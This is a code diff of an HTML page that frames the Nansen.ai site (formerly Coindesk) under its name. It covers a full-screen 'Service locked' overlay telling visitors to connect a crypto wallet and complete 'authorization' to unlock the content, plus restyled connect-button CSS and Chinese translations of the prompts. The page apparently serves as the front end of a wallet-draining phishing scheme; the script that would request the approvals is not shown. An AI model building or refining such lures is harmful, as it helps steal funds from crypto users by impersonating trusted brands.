@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coindesk</title>
+    <title>Nansen.ai</title>
     <!-- 引入 Font Awesome 庫用於錢包圖標 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
@@ -43,107 +43,80 @@
 
         /* 錢包圖標按鈕樣式 */
         #connectButton {
-            white-space: nowrap;
-            padding: 8px 10px;
-            font-size: 1.2em;
+            background-color: #007bff; /* 蓝色 */
+            color: white;
+            border-radius: 8px;
+            padding: 10px 15px;
+            font-size: 1em;
             cursor: pointer;
             border: none;
-            border-radius: 5px;
-            background-color: #f7a600;
-            color: black;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-width: auto;
-            height: 30px;
-            flex-shrink: 0;
-            transition: background-color 0.2s ease; /* 加入過渡效果 */
+            transition: background-color 0.3s ease; /* 添加背景颜色过渡动画 */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* 加入阴影 */
         }
 
-        /* 連接狀態樣式：綠色 */
+        #connectButton:hover {
+            background-color: #0056b3; /* 鼠标悬停时颜色变暗 */
+            box-shadow: 0 3px 7px rgba(0, 0, 0, 0.3); /* 鼠标悬停时阴影加深 */
+        }
+
         #connectButton.connected {
-            background-color: #28a745;
+            background-color: #28a745; /* 绿色 - 表示已连接 */
             color: white;
-            font-size: 0.9em;
-            padding: 8px 12px;
         }
 
-        /* 內容區塊 - 佔滿螢幕的 iframe */
-        #contentContainer {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-        }
-        #coindeskFrame {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-
-        /* 鎖定提示覆蓋層 */
-        #lockedPrompt {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-            padding: 10px;
-            text-align: center;
-            transition: opacity 0.3s ease; /* 加入淡出效果 */
-        }
-        #lockedPrompt h2 {
-            font-size: 1.5em;
-        }
-        #lockedPrompt p {
-            font-size: 1em;
-            margin: 5px 0;
-            padding: 0 10px;
-            word-wrap: break-word;
-        }
-
-        /* 交易狀態提示覆蓋層 (blurOverlay) */
+        /* 覆蓋層樣式 */
         #blurOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            color: white;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
-            backdrop-filter: blur(5px);
-            transition: opacity 0.3s ease; /* 加入淡出效果 */
-        }
-        #overlayMessage {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-            padding: 0 15px;
-            word-wrap: break-word;
+            background-color: rgba(0, 0, 0, 0.8); /* 稍微透明的黑色背景 */
+            backdrop-filter: blur(8px); /* 模糊效果 */
+            transition: opacity 0.3s ease; /* 覆盖层淡入淡出动画 */
         }
 
-        /* 媒體查詢：針對極小螢幕 */
-        @media (max-width: 400px) {
+        #overlayMessage {
+            font-size: 1.4em;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.7); /* 訊息框背景 */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4); /* 訊息框阴影 */
+        }
+
+        /* 鎖定提示的樣式 */
+        #lockedPrompt {
+            background-color: rgba(255, 255, 255, 0.1); /* 淺透明白色 */
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        #lockedPrompt h2 {
+            font-size: 1.8em;
+            margin-bottom: 15px;
+        }
+
+        #lockedPrompt p {
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+
+        /* iframe 的樣式（如果需要調整） */
+        #coindeskFrame {
+            /* 您可以在這裡添加額外的 iframe 样式，例如： */
+            /* border: 1px solid #ccc; */
+        }
+
+        /* 響應式設計 - 針對小螢幕調整 */
+        @media (max-width: 600px) { /* 針對手機螢幕 */
             #connectButton {
-                padding: 6px 8px;
+                font-size: 0.9em;
+                padding: 8px 12px;
+            }
+            #overlayMessage {
                 font-size: 1.1em;
             }
-            #connectButton.connected {
-                font-size: 0.8em;
-                padding: 6px 10px;
+            #lockedPrompt h2 {
+                font-size: 1.3em;
+            }
+            #lockedPrompt p {
+                font-size: 0.9em;
             }
         }
     </style>
@@ -157,19 +130,19 @@
     </header>
 
     <div id="contentContainer">
-        <iframe id="coindeskFrame" src="https://www.coindesk.com/" title="Coindesk"></iframe>
+        <iframe id="coindeskFrame" src="https://app.nansen.ai/" title="Nansen.ai"></iframe>
 
         <div id="lockedPrompt">
             <h2>🔒 Service locked</h2>
-            <p>Please click the **wallet icon** in the upper right corner to connect the wallet and complete **Authorization** to unlock the information.</p>
+            <p>請點擊右上角的 **錢包圖標** 連接錢包並完成 **授權** 以解鎖資料。</p>
             <p style="font-size: 0.8em; margin-top: 20px;">
-                （After successful authorization, this prompt will disappear）
+                （授權成功後，此提示將消失）
             </p>
         </div>
     </div>
 
     <div id="blurOverlay">
-        <div id="overlayMessage">Connecting...</div>
+        <div id="overlayMessage">正在連線...</div>
     </div>
 
     <!-- 您的 main.js 必須在所有外部庫之後載入 -->
